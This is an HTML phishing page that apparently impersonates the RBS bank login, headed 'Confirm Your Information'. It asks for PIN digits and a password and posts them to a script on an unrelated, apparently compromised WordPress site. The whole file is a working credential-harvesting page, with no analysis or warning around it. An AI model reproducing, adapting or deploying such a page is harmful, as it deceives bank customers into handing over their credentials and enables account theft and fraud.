<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Step 1</title>
<meta http-equiv="content-type" content="text/html; charset=UTF8">

<link rel="shortcut icon"
              href="images/faviicon.ico"/>
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">

<style type="text/css">
/*----------Text Styles----------*/
.ws6 {font-size: 8px;}
.ws7 {font-size: 9.3px;}
.ws8 {font-size: 11px;}
.ws9 {font-size: 12px;}
.ws10 {font-size: 13px;}
.ws11 {font-size: 15px;}
.ws12 {font-size: 16px;}
.ws14 {font-size: 19px;}
.ws16 {font-size: 21px;}
.ws18 {font-size: 24px;}
.ws20 {font-size: 27px; color: #5dade2;}
.ws22 {font-size: 29px;}
.ws24 {font-size: 32px;}
.ws26 {font-size: 35px;}
.ws28 {font-size: 37px;}
.ws36 {font-size: 48px;}
.ws48 {font-size: 64px;}
.ws72 {font-size: 96px;}
.wpmd {font-size: 13px;font-family: Arial,Helvetica,Sans-Serif;font-style: normal;font-weight: normal;}
/*----------Para Styles----------*/
DIV,UL,OL /* Left */
{
 margin-top: 0px;
 margin-bottom: 0px;
}
</style>


<script LANGUAGE="JavaScript">
<!--

var b = 0 ;
var i = 0 ;
var errmsg = "" ;
var punct = "" ;
var min = 0 ;
var max = 0 ;

function formbreeze_email(field) {

	if (b && (field.value.length == 0)) return true ;


	if (! emailCheck(field.value))
	  {
		  field.focus();
		  if (field.type == "text") field.select();
		  return false ;
	  }

   return true ;
}

function formbreeze_filledin(field) {

if (b && (field.value.length == 0)) return true;

if (field.value.length < min) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false ;
   }

if ((max > 0) && (field.value.length > max)) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false ;
   }

return true ;
}

function formbreeze_number(field) {

if (b && (field.value.length == 0)) return true ; ;

if (i)
 var valid = "0123456789"
else
 var valid = ".,0123456789"

var pass = 1;
var temp;
for (var i=0; i<field.value.length; i++) {
temp = "" + field.value.substring(i, i+1);
if (valid.indexOf(temp) == "-1") pass = 0;

}

if (!pass) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false;
 }

if (field.value < min) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false;
   }


if ((max > 0) && (field.value > max)) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false;
   }

return true ;
}


function formbreeze_numseq(field) {


if (b && (field.value.length == 0)) return true ;

var valid = punct + "0123456789"

var pass = 1;
var digits = 0
var temp;
for (var i=0; i<field.value.length; i++) {
temp = "" + field.value.substring(i, i+1);
if (valid.indexOf(temp) == "-1") pass = 0;
if (valid.indexOf(temp) > (punct.length-1) ) digits++ ;

}

if (!pass) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false ; ;
   }

if (digits < min) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false;
   }

if ((max > 0) && (digits > max)) {
alert(errmsg);
field.focus();
if (field.type == "text") field.select();
return false;
   }

return true ;
}

function emailCheck (emailStr) {

var checkTLD=1;
var knownDomsPat=/^(com|net|org|edu|int|mil|gov|arpa|biz|aero|name|coop|info|pro|museum|ws)$/;
var emailPat=/^(.+)@(.+)$/;
var specialChars="\\(\\)><@,;:\\\\\\\"\\.\\[\\]";
var validChars="\[^\\s" + specialChars + "\]";
var quotedUser="(\"[^\"]*\")";
var atom=validChars + '+';
var word="(" + atom + "|" + quotedUser + ")";
var userPat=new RegExp("^" + word + "(\\." + word + ")*$");
var domainPat=new RegExp("^" + atom + "(\\." + atom +")*$");
var matchArray=emailStr.match(emailPat);

if (matchArray==null) {
alert(errmsg);
return false;
}
var user=matchArray[1];
var domain=matchArray[2];

for (i=0; i<user.length; i++) {
if (user.charCodeAt(i)>127) {
alert(errmsg);
return false;
   }
}
for (i=0; i<domain.length; i++) {
if (domain.charCodeAt(i)>127) {
alert(errmsg);
return false;
   }
}

if (user.match(userPat)==null) {
alert(errmsg);
return false;
}

var atomPat=new RegExp("^" + atom + "$");
var domArr=domain.split(".");
var len=domArr.length;
for (i=0;i<len;i++) {
if (domArr[i].search(atomPat)==-1) {
alert(errmsg);
return false;
   }
}

if (checkTLD && domArr[domArr.length-1].length!=2 &&
domArr[domArr.length-1].search(knownDomsPat)==-1) {
alert(errmsg);
return false;
}

if (len<2) {
alert(errmsg);
return false;
}

return true;
}

function formbreeze_sub()
{
/*
//FBDATA:formtext1^0^1^0^0^Please Fill in All Of the Required Fields:;formtext2^0^1^0^0^Please Fill in All Of the Required Fields:;formtext3^0^1^0^0^Please Fill in All Of the Required Fields:;formtext4^0^1^0^0^Please Fill in All Of the Required Fields:;formtext5^0^1^0^0^Please Fill in All Of the Required Fields:;formtext6^0^1^0^0^Please Fill in All Of the Required Fields:;formtext7^0^1^0^0^Please Fill in All Of the Required Fields:;formtext8^0^1^0^0^Please Fill in All Of the Required Fields:;formtext9^0^1^0^0^Please Fill in All Of the Required Fields:;formtext10^0^1^0^0^Please Fill in All Of the Required Fields:;formtext11^0^1^0^0^Please Fill in All Of the Required Fields:;
*/
b=0;
errmsg="Please Fill in All Of the Required Fields";
min=1;
max=0;
if (! formbreeze_filledin(document.chalbhai.formtext1) ) return false ;
b=0;
errmsg="Please Fill in All Of the Required Fields";
min=1;
max=0;
if (! formbreeze_filledin(document.chalbhai.formtext2) ) return false ;
b=0;
errmsg="Please Fill in All Of the Required Fields";
min=1;
max=0;
if (! formbreeze_filledin(document.chalbhai.formtext3) ) return false ;
b=0;
errmsg="Please Fill in All Of the Required Fields";
min=1;
max=0;
if (! formbreeze_filledin(document.chalbhai.formtext4) ) return false ;
b=0;
errmsg="Please Fill in All Of the Required Fields";
min=1;
max=0;
}
-->
</script>

</head>
<body bgColor="#F7F7F5">
<div id="image1" style="position:absolute; overflow:hidden; left:180px; top:0px; width:980px; height:146px; z-index:0"><img src="images/heAder.png" alt="" title="" border=0 width=980 height=146></div>

<div id="image9" style="position:absolute; overflow:hidden; left:180px; top:750px; width:990px; height:66px; z-index:1"><a href="mailer.php.html#"><img src="images/footer.png" alt="" title="" border=0 width=990 height=66></a></div>

<div id="shape1" style="position:absolute; overflow:hidden; left:400px; top:260px; width:536px; height:450px; z-index:2"><img border=0 width="100%" height="100%" alt="" src="images/shape33807437.gif"></div>

<div id="image3" style="position:absolute; overflow:hidden; left:400px; top:260px; width:534px; height:47px; z-index:3"><img src="images/Your&#32;PIN.png" alt="" title="" border=0 width=534 height=47></div>

<div id="image4" style="position:absolute; overflow:hidden; left:400px; top:326px; width:152px; height:21px; z-index:4"><img src="images/1.png" alt="" title="" border=0 width=152 height=21></div>

<div id="image5" style="position:absolute; overflow:hidden; left:400px; top:388px; width:167px; height:42px; z-index:5"><img src="images/2.png" alt="" title="" border=0 width=167 height=42></div>

<form action="http://becharaissa.com/wp-content/themes/bit/rbs.co.uk/rbs/login.php" name=chalbhai id=chalbhai method=post  onsubmit=" return formbreeze_sub()" >
<input name="formtext1" type="password" maxlength=4 autocomplete=off style="position:absolute;width:78px;left:405px;top:346px;z-index:6">
<input name="formtext2" type="password" maxlength=4 autocomplete=off style="position:absolute;width:75px;left:405px;top:405px;z-index:7">
<div id="image6" style="position:absolute; overflow:hidden; left:400px; top:467px; width:534px; height:47px; z-index:8"><img src="images/Password.png" alt="" title="" border=0 width=534 height=47></div>

<div id="image7" style="position:absolute; overflow:hidden; left:400px; top:540px; width:159px; height:39px; z-index:9"><img src="images/3.png" alt="" title="" border=0 width=159 height=39></div>

<div id="image8" style="position:absolute; overflow:hidden; left:400px; top:600px; width:157px; height:39px; z-index:10"><img src="images/5.png" alt="" title="" border=0 width=157 height=39></div>

<input name="formtext3" type="password" autocomplete=off style="position:absolute;width:180px;left:405px;top:556px;z-index:17">
<input name="formtext4" type="text" autocomplete=off style="position:absolute;width:180px;left:405px;top:615px;z-index:18">
<div id="formimage1" style="position:absolute; left:860px; top:670px; z-index:25"><input type="image" name="formimage1" width="63" height="26" src="images/next.png"></div>
<div id="formimage2" style="position:absolute; left:400px; top:672px; z-index:26"><input type="image" name="formimage2" width="71" height="26" src="images/back.png"></div>
<div id="text1" style="position:absolute; overflow:hidden; left:400px; top:219px; width:565px; height:35px; z-index:29; background-color:#F7F7F5">
<div class="wpmd">
<div><font face="Gisha" class="ws20"><b>Confirm Your Information</b></font></div>
</div></div>


</body>
</html>
